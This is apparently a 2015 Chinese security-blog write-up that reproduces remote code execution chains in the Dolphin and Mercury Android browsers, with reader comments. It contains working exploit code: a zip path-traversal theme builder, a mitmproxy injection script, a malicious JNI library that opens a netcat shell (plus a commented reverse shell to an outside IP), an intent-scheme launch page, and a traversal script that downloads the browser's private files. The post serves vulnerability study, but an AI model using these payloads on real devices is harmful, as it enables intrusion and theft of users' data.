@@ -1,0 +1,154 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">海豚浏览器与水星浏览器远程代码执行漏洞详解</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">小荷才露尖尖角</a> <span class="bull">·</span> <time title="2015/08/31 9:44" ui-time="" datetime="2015/08/31 9:44" class="published ng-binding ng-isolate-scope">2015/08/31 9:44</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>最近国外安全研究人员rotlogix连续曝光了安卓版海豚浏览器（dolphin browser）和水星浏览器（mercury browser）的安全漏洞[1,2]，尽管这两个浏览器在国内并不流行，但其中的远程攻击手法和一系列漏洞组合的利用颇值得玩味，于是对这两个漏洞进行了复现和学习，分享与大家共同进步。</p><h1>0x01 海豚浏览器远程代码执行漏洞</h1><hr><p>该漏洞可以看作前段时间三星自带Swift输入法远程代码漏洞的延伸，不同之处在于通过中间人攻击patch了so文件，在so文件中的JNI_OnLoad函数中添加恶意代码，当so被加载后有机会实现远程代码执行。此次测试的海豚浏览器版本为V11.4.17。</p><h2>1. 漏洞原理</h2><p>海豚浏览器允许用户选择并应用主题来改变浏览器的外观，当用户选择新主题下载时，主题文件会被下载</p><pre><code>GET https://opsen-static.dolphin-browser.com/resources/themestore/Alonso_P.dwp
+</code></pre><p>主题文件实际是一个zip文件，对其重命名后查看内容如下：</p><p><img alt="image" img-src="a6045f4a4b9b7c81e0135b26f04d6180f6f6c6fb.jpg"></p><p>由于海豚浏览器并未对解压的文件进行验证，且安卓系统zip库的默认行为是允许解压文件到所在目录之外，因此通过中间人攻击，修改HTTP请求返回主题文件zip包中的内容，可以实现在海豚浏览器拥有权限的目录写文件。</p><p>注意到我们测试的版本与原文有所不同，下载主题文件的链接是https，但其SSL也没有正确实现，因此依然也能通过中间人攻击成功。</p><h2>2. 漏洞利用——在私有目录写文件</h2><p>漏洞利用需要通过中间人攻击，将手机的流量透明代理到运行mitmproxy的服务器上。首先，利用python制作一个修改后的主题文件，即将同目录下名为1的文件添加到主题文件zip包中，且文件名为<code>../../../../../../data/data/mobi.mgeek.TunnyBrowser/files/this_should_not_exsist</code></p><pre><code>#!python
+import zipfile
+
+zf = zipfile.ZipFile("Alonso_P.dwp", "a")
+zf.write("1", "../../../../../../data/data/mobi.mgeek.TunnyBrowser/files/this_should_not_exsist")
+zf.close()
+</code></pre><p>修改后的主题文件如下</p><p><img alt="image" img-src="ab9cf981a0fbef729844331db88bca123d76acd9.jpg"></p><p>接下来，编写一段mitmproxy的inline script inject_evilso.py，将下载返回的主题文件替换成我们修改后的主题文件。</p><pre><code>#!java
+from libmproxy.protocol.http import HTTPResponse
+from netlib.odict import ODictCaseless
+
+def request(context, flow):
+    if not flow.request.host =="opsen-static.dolphin-browser.com"  or not flow.request.path.endswith(".dwp"):
+        return
+
+    # Build response
+
+    response = HTTPResponse([1, 1], 200, "OK", ODictCaseless([["Content-Type", "application/zip"]]), "yo!") # Inject theme
+    # Inject theme
+    try:
+        with open("Alonso_P.dwp", "r") as f:
+            modified = f.read()
+            response.content = modified
+            response.headers["Content-Length"] = [len(modified)]
+            f.close()
+    except IOError as e:
+        raise e
+
+    # Return response
+    #
+    flow.reply(response)
+</code></pre><p>使用mitmdump运行脚本</p><pre><code>mitmdump -s inject_evilso.py
+</code></pre><p>在手机上使用海豚浏览器，下载并应用主题。观察到mitmdump的输出</p><pre><code>192.168.8.155 GET https://opsen-static.dolphin-browser.com/resources/themestore/Grassy.dwp
+ &lt;&lt; 200 OK 210.39kB
+</code></pre><p>此时查看海豚浏览器私有目录，压缩包中放置的恶意文件已经写入成功。</p><p><img alt="image" img-src="d12f06a02a763fe1e42f8154d1ecb33ebf185996.jpg"></p><h2>3. 漏洞利用——patch so实现代码执行</h2><p>要将任意文件写升级为代码执行，可以考虑对海豚浏览器二次加载的库进行patch，与Swift输入法漏洞利用过程中patch odex文件所不同，这里选择的是patch上述目录下的libdolphin.so。</p><p>首先用ndk编译一个恶意的libdolphin.so</p><pre><code>#!c++
+#include &lt;stdio.h&gt;
+#include &lt;jni.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;android/log.h&gt;
+
+#define LOG "heen"
+#define LOGI(...)  __android_log_print(ANDROID_LOG_INFO,LOG,__VA_ARGS__)
+
+jint JNICALL JNI_OnLoad(JavaVM* vm, void* reserved)
+{
+    JNIEnv* env = NULL;
+    jint result = -1;
+    int ret;
+
+    if ((*vm)-&gt;GetEnv(vm, (void**) &amp;env, JNI_VERSION_1_4) != JNI_OK) {
+        return -1;
+    }
+    /* success -- return valid version number */
+    result = JNI_VERSION_1_4;
+
+    LOGI("Hello, World");
+    //ret = system("nc 192.168.8.163 8088|/system/bin/sh|nc 192.168.8.163 9999");
+    ret = system("nc -ll -p 6666 -e /system/bin/sh");
+    LOGI("ret value of system is %d",ret);
+
+   // sleep(1800);
+
+    return result;
+}
+</code></pre><p>然后按照前面的方法将编译的so文件添加到主题文件压缩包中，</p><p><img alt="image" img-src="05a346211e56504861b7fc51ae1ee93a8796d2d3.jpg"></p><p>手机上重新下载主题文件并应用，这将触发mitmdump脚本替换下载返回的主题文件为添加恶意so的主题文件。此时我们结束海豚浏览器，并重新打开，使其有机会加载我们改写的so。logcat将有如下输出，</p><pre><code>D/dalvikvm(25522): Trying to load lib /data/data/mobi.mgeek.TunnyBrowser/files/libdolphin.so 0x42687bc0
+D/dalvikvm(25522): Added shared lib /data/data/mobi.mgeek.TunnyBrowser/files/libdolphin.so 0x42687bc0
+</code></pre><p>而海豚浏览器也并未崩溃，可以正常浏览网页。用nc连接，patch的恶意代码已经生效</p><p><img alt="image" img-src="2245318d96cbcf3addd43b3962c80151bb66f98c.jpg"></p><h1>0x02 水星浏览器远程代码执行漏洞</h1><hr><p>漏洞首先在于水星浏览器没有正确过滤Intent URI Scheme，这导致恶意网页可以利用Intent Scheme调用私有组件启动水星浏览器实现的web server。而该webserver又对文件名路径校验不严格，导致可通过目录穿越来获取浏览器私有目录下文件或sdcard下的任意文件。测试版本为v3.2.3。</p><h2>1. Intent Scheme未正确过滤</h2><p>在com.ilegendsoft.mercury.ui.widget.webview.g类中有如下代码</p><p><img alt="image" img-src="a54b17088e30d3649dcd234034fe33d7595ecb6f.jpg"></p><p>intent对象在传入startActivity方法前并没有按如下方式进行过滤</p><pre><code>// forbid launching activities without BROWSABLE category  
+intent.addCategory("android.intent.category.BROWSABLE");  
+// forbid explicit call  
+intent.setComponent(null);  
+// forbid intent with selector intent  
+intent.setSelector(null);  
+</code></pre><p>因此可以通过网页嵌入如下形式的脚本启动任意activity，包括私有activity。</p><pre><code>&lt;script&gt;location.href="intent:#Intent;action=android.intent.action.VIEW;component=包名/组件名";&lt;/script&gt;
+</code></pre><h2>2. 寻找攻击对象</h2><p>这种情况一般是寻找私有未导出的activity作为攻击对象。经过逆向分析，可发现未导出activity——com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2被启动时，可打开手机与电脑之间的WiFi文件传输功能。</p><p>见WFMActivity2的OnResume方法，</p><pre><code>#!java
+ protected void onResume() {
+        super.onResume();
+        this.mWfmFragment.onServAvailable();
+    }
+</code></pre><p>调用其成员变量mWfmFragment对象的onServAvailable方法，位于<code>com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2.WFMFragment</code></p><pre><code>#!java
+public void onServAvailable() {
+        if(this.needResumeServer) {
+            this.doStartClick();
+}
+</code></pre><p>调用doStartClick方法</p><pre><code>#!java
+private void doStartClick() {
+        this.ipAddr = this.mCommonUtil.getLocalIpAddress(true);
+        if(this.ipAddr == null || !this.isWebServAvailable()) {
+            this.mStep2Tv.setText("");
+            d.c(this.getString(2131165689));
+        }
+        else {
+            this.updateOnUI(this.ipAddr);
+            this.doBindService();
+            this.needResumeServer = false;
+        }
+    }
+</code></pre><p>见关键的doBindService方法，其实现位于WFMFragement的父类 AbsWFMFragment</p><pre><code>#!java
+protected void doBindService() {
+        this.getActivity().bindService(this.webServIntent, this.servConnection, 1);
+        this.isBound = true;
+    }
+</code></pre><p>再看OnCreate方法</p><pre><code>#!java
+    public void onCreate(Bundle arg4) {
+        super.onCreate(arg4);
+        this.webServIntent = new Intent(this.getActivity(), WebService.class);
+    }
+</code></pre><p>至此，可知WFMActivity2被启动时，同时将启动一个与其绑定的一个WebService，该Service在OnBind方法中打开一个WebServer。</p><pre><code>#!java
+  public IBinder onBind(Intent arg2) {
+        this.openWebServer();
+        return this.mBinder;
+    }
+</code></pre><p>该WebServer注册了一些特定的URI路径，实现了下载dodownload、删除dodelete、上传doupload等命令。</p><p><img alt="image" img-src="9a11b7ed768c8c70e78dd23424473be08e41708e.jpg"></p><h2>3. 攻击私有组件WFMActivity2</h2><p>首先编写恶意网页启动WFMActivity2</p><pre><code>#!html
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset="utf-8" /&gt;
+        &lt;title&gt;Trigger parseUri()&lt;/title&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &lt;script&gt;
+            location.href="intent:#Intent;SEL;component=com.ilegendsoft.mercury/.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";
+        &lt;/script&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>然后用水星浏览器访问该恶意网页，出现如下界面</p><p><img alt="image" img-src="e14c9ff98966d1888c491a2d11fdf30f0009b223.jpg"></p><p>此时PC端已经能够访问webserver，并具有对手机中sdcard文件上传、下载和删除功能。</p><p><img alt="image" img-src="5b177effbefbbc6fc00575a06d205ba59a879266.jpg"></p><h2>4. 目录穿越漏洞</h2><p>默认情况下只能下载访问sdcard目录，但进一步的漏洞挖掘发现WFMActivity2打开的WebServer还具有目录穿越漏洞，可以通过dodownload和doupload命令以访问../../[程序私有目录] 的形式下载或上传私有目录的文件。</p><p>根据HTTPDownHandler中的处理代码，</p><p><img alt="image" img-src="cc8aeb702db29d04876305a151464eb509d78ee5.jpg"></p><p>需要正确设置HTTP请求中的Referer才能进入成功的下载处理分支。</p><p><img alt="image" img-src="91ea94ed8547316447277d34b0fa80ca5e28f638.jpg"></p><p>对程序配置文件私有目录打包下载 <img alt="image" img-src="800f236cd2b655edf2e81822aadbba38046e7aca.jpg"> 使用doupload命令类似，可以实现上传文件到程序私有目录。</p><h4>5. 漏洞利用总结</h4><p>至此，一系列漏洞利用组合可归纳如下：</p><p>(1) 通过恶意网页的Intent URI Scheme启动WFMActivity2</p><p>(2) 记录使用水星浏览器目标用户的IP地址</p><p>(3) 轮询WFMActivity2是否被启动</p><p>(4) 利用目录穿越漏洞下载水星浏览器的私有目录文件</p><p>附攻击脚本（使用lighttpd）</p><pre><code>#!python
+import os,re,requests
+
+def poll():
+
+    keyword = 'evil.html'
+    while True:
+        with open("/usr/local/var/log/lighttpd/access.log", 'r') as f:
+            print 'Polling...\n'
+            for line in f.readlines():
+                if re.search(keyword, line):
+                    target = line.split()[0]
+                    headers = {'Referer': 'http://%s:8888/'%target}
+                    url = 'http://%s:8888/dodownload'%target
+                    payload = {'fname': '../../../../data/data/com.ilegendsoft.mercury/shared_prefs/com.ilegendsoft.mercury_preferences.xml'}
+                    try:
+                        r = requests.get(url, params = payload, headers = headers)
+                        print 'Exploiting...\n'
+                        print r.status_code, r.content
+                        return
+                    except Exception as e:
+                        continue
+                else:
+                    continue
+if __name__ == '__main__':
+    poll()
+</code></pre><p>攻击效果</p><p><img alt="image" img-src="5c34fceeb8bdcc3417ac5b693d8d68fb9238fc67.jpg"></p><h1>0x03 参考</h1><hr><pre><code>[1] http://rotlogix.com/2015/08/22/remote-code-execution-in-dolphin-browser-for-android/
+
+[2] http://rotlogix.com/2015/08/23/exploiting-the-mercury-browser-for-android/
+</code></pre><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/2893" rel="bookmark" id="re1">Intent scheme URL attack</a></li><li><a href="http://drops.wooyun.org/tips/2736" rel="bookmark" id="re2">Samsung S Voice attack</a></li><li><a href="http://drops.wooyun.org/papers/548" rel="bookmark" id="re3">WebView中接口隐患与手机挂马利用</a></li><li><a href="http://drops.wooyun.org/papers/6632" rel="bookmark" id="re4">三星默认输入法远程代码执行</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">兜兜豆</span> <span class="reply-time">2015-11-05 22:48:39</span></div><p></p><p>@兜兜豆 问题得到解决，打扰啦。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">兜兜豆</span> <span class="reply-time">2015-11-05 20:36:09</span></div><p></p><p>你好，我在学习这个漏洞的时候遇到了一个问题，在最后nc连接以后执行任何代码都返回0，如果执行netstat 则会返回0 tstat，这是什么原因呢？希望有懂得人告知一下，真的非常感谢。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-08-31 17:54:35</span></div><p></p><p>感觉都是作啊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nicky</span> <span class="reply-time">2015-08-31 14:28:38</span></div><p></p><p>精彩的翻译和分析~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mickey</span> <span class="reply-time">2015-08-31 11:50:43</span></div><p></p><p>第二个比较屌</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">进击的zjx</span> <span class="reply-time">2015-08-31 10:43:56</span></div><p></p><p>牛掰~先顶后看</p><p></p></div></div></div></div></div></main>
